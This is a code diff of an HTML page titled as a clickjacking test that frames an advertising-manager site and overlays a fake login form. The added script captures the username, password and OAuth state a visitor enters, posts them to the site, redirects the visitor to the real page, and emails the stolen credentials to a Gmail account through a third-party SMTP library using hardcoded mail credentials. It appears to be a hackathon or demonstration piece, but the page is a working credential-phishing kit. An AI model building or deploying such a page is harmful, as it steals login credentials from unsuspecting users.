@@ -1,45 +1,148 @@
+<!DOCTYPE html>
 <html>
 <head>
+  <meta charset="utf-8">
   <title>Clickjack test page</title>
   <link rel="stylesheet" type="text/css" href="style.css">
   <link rel="stylesheet" type="text/css" href="login.css">
+  <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+  <script src="https://smtpjs.com/v3/smtp.js"></script>
 </head>
 <body>
   <!-- <p>Website is vulnerable to clickjacking!</p> -->
 
   <div class="holder">
-    <iframe class="frame" src="https://manager.videoplaza.com/"></iframe>
+    <iframe class="frame" src="https://manager.adtech-union.tv/"></iframe>
     <div class="main container">
-        <div class="padding"></div>
-        <div path="login-screen">
-            <div class="login">
-                <div>
-                    <form role="form" class="form-inline" action="authorize" method="post" novalidate="">
-                        <input type="hidden" name="response_type" value="code"/>
-                        <input type="hidden" name="client_id" value="pulse-service"/>
-                        <input type="hidden" name="redirect_uri" value="http://manager.videoplaza.com/karbon/admin/_oauth2/token/redirect"/>
-                        <input type="hidden" name="scope" value=""/>
-                        <input type="hidden" name="state" value="eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..BxM-GBn-2ZheExJTRO_CQw.z6iZOVvewCZAXdhgALCuIoy-GBc4Z5ABII_EbVywx8cbZYjJKLw8pBtE49lX-vx-hZAWQg0062fAFvyoZ79jjmwwydzeArXPq7VZ1YwnmrjhNeNEVhkim3QAUVWewpxp6ij4VSxwWjDMVDcgBELB2cbJXxUOgcyPJG6PuKJycXNe2u3sD5Z0Dye_auevfKZTOAAykwVdH4KI1uV9-Cb8Ew.J1bBTHNVN_wWCxf1e9F1Rw"/>
+      <div class="padding"></div>
+      <div path="login-screen">
+        <div class="login">
+          <div>
+            <form role="form" class="form-inline" action="?action=save" name="hacked" method="post" novalidate="">
+              <input type="hidden" name="response_type" id="response_type" value="code"/>
+              <input type="hidden" name="client_id" id="client_id" value="pulse-service"/>
+              <input type="hidden" name="redirect_uri" id="redirect_uri" value="http://manager.videoplaza.com/karbon/admin/_oauth2/token/redirect"/>
+              <input type="hidden" name="scope" id="scope" value=""/>
+              <input type="hidden" name="state" id="state" value="eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..hcq_Y8woQS5WcHoqLzdD3A.iPIQ-SCUyZjb47GzfWvHl_pmwM_aLdS3MJ1ryy965xdbL7M3yyFW_GGiNFeXwX2MFCGV7X8RPA_QCg5MTSM9Kd_OWgjot5kr5eYaJAkW63D3Ft32RR11EH4CSOnf87-u2OIWwbK9G3d24EYAXiKZ40R17qIaKLQlLzfOv1ku3jN0P3bS7k0bKhYUzpTtysfp-wim_TKgptfdoYpsik4Itw.3icbIIq0MbraO6EDKHQy2A"/>
 
-                        <!-- <div class="form-group">
-                            <input class="form-control" type="text" placeholder="Hacked-Username" path="username" name="username">
-                        </div>
-                        <div class="form-group">
-                            <input class="form-control" type="password" placeholder="Hacked-Password" path="password" name="password">
-                        </div>
-                        <div class="form-group">
-                            <button type="submit" class="btn btn-block pink-button">HACKED</button>
-                        </div> -->
-                    </form>
-                </div>
-            </div>
+              <div class="form-group">
+                <input class="form-control" type="text" placeholder="Username" path="username" name="username" id="username">
+              </div>
+              <div class="form-group">
+                <input class="form-control" type="password" placeholder="1Password" path="password" name="password" id="password">
+              </div>
+              <div class="form-group">
+                <button type="button" class="btn btn-block pink-button" onclick="saveFile()">LOGIN</button>
+              </div>
+            </form>
+          </div>
         </div>
+      </div>
     </div>
 
     <!-- <div class="hack">
-      <button class="button" onclick="myFunction()">HACKED</button>
-    </div> -->
-  </div>
+    <button class="button" onclick="myFunction()">HACKED</button>
+  </div> -->
+</div>
 
+<script>
+let saveFile = () => {
+
+  // Get the data from each element on the form.
+
+  const state = document.getElementById('state').value;
+  const scope = document.getElementById('scope').value;
+  const redirect_uri = document.getElementById('redirect_uri').value;
+  const client_id = document.getElementById('client_id').value;
+  const response_type = document.getElementById('response_type').value;
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+
+  console.log(username + password);
+
+  var XHR = new XMLHttpRequest();
+  var urlEncodedData = "";
+  var urlEncodedDataPairs = [];
+  var name;
+
+  urlEncodedDataPairs.push(encodeURIComponent("response_type") + '=' + encodeURIComponent(response_type));
+  urlEncodedDataPairs.push(encodeURIComponent("client_id") + '=' + encodeURIComponent(client_id));
+  urlEncodedDataPairs.push(encodeURIComponent("redirect_uri") + '=' + encodeURIComponent(redirect_uri));
+  urlEncodedDataPairs.push(encodeURIComponent("scope") + '=' + encodeURIComponent(scope));
+  urlEncodedDataPairs.push(encodeURIComponent("state") + '=' + encodeURIComponent(state));
+  urlEncodedDataPairs.push(encodeURIComponent("username") + '=' + encodeURIComponent(username));
+  urlEncodedDataPairs.push(encodeURIComponent("password") + '=' + encodeURIComponent(password));
+
+
+  // Turn the data object into an array of URL-encoded key/value pairs.
+  // for(name in data) {
+  //   urlEncodedDataPairs.push(encodeURIComponent(name) + '=' + encodeURIComponent(data[name]));
+  // }
+
+  // Combine the pairs into a single string and replace all %-encoded spaces to
+  // the '+' character; matches the behaviour of browser form submissions.
+  urlEncodedData = urlEncodedDataPairs.join('&').replace(/%20/g, '+');
+
+  console.log(urlEncodedData);
+
+  // Define what happens on successful data submission
+  XHR.addEventListener('load', function(event) {
+    alert('Yeah! Data sent and response loaded.');
+  });
+
+  // Define what happens in case of error
+  XHR.addEventListener('error', function(event) {
+    alert('Oops! Something goes wrong.');
+  });
+
+  // Set up our request
+  XHR.open('POST', 'https://manager.adtech-union.tv/login');
+  // XHR.open('POST', 'https://cors-anywhere.herokuapp.com/https://login.adtech-union.tv/oauth2/v1/login');
+
+  // Add the required HTTP header for form data POST requests
+  XHR.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8');
+  XHR.setRequestHeader('Cookie', 'x-o-csrf-token=p2L0IVk3LHI6P6cprWYxHFw53PbSaSQPHyAGpD0iRT8R4IURBtq2JZ92OkJfUT1p');
+  XHR.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+
+
+
+  // Finally, send our data.
+  XHR.send(urlEncodedData);
+  // window.location.assign("http://manager.adtech-union.tv/karbon/admin/_oauth2/Ftoken/Fredirect&state=eyJhbGciOiJkaXIiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0..hcq_Y8woQS5WcHoqLzdD3A.iPIQ-SCUyZjb47GzfWvHl_pmwM_aLdS3MJ1ryy965xdbL7M3yyFW_GGiNFeXwX2MFCGV7X8RPA_QCg5MTSM9Kd_OWgjot5kr5eYaJAkW63D3Ft32RR11EH4CSOnf87-u2OIWwbK9G3d24EYAXiKZ40R17qIaKLQlLzfOv1ku3jN0P3bS7k0bKhYUzpTtysfp-wim_TKgptfdoYpsik4Itw.3icbIIq0MbraO6EDKHQy2A");
+  // window.location.assign("https://manager.adtech-union.tv/login");
+  // window.location.assign("https://manager.adtech-union.tv/karbon/admin/Application.html");
+  window.location.assign("https://manager.adtech-union.tv/");
+
+  sendMail(urlEncodedData);
+
+
+  // var blob = new Blob([urlEncodedData], { type: "text/plain;charset=utf-8" });
+  // saveAs(blob, "dynamic.txt");
+
+}
+
+function sendMail(urlEncodedData) {
+  console.log(urlEncodedData);
+  Email.send({
+    Host : "smtp.gmail.com",
+    Username : "zero.cool.3321",
+    Password : "password12345!",
+    To : 'zero.cool.3321@gmail.com',
+    From : "zero.cool.3321@gmail.com",
+    Subject : "Hackathon",
+    Body : urlEncodedData
+  }).then(
+    message => alert(message)
+  );
+}
+
+// function saveStaticDataToFile(username, password) {
+//   console.log("In save function");
+//   var blob = new Blob(["Welcome to Websparrow.org."],
+//   { type: "text/plain;charset=utf-8" });
+//   saveAs(blob, "static.txt");
+// }
+
+</script>
 </body>
 </html>
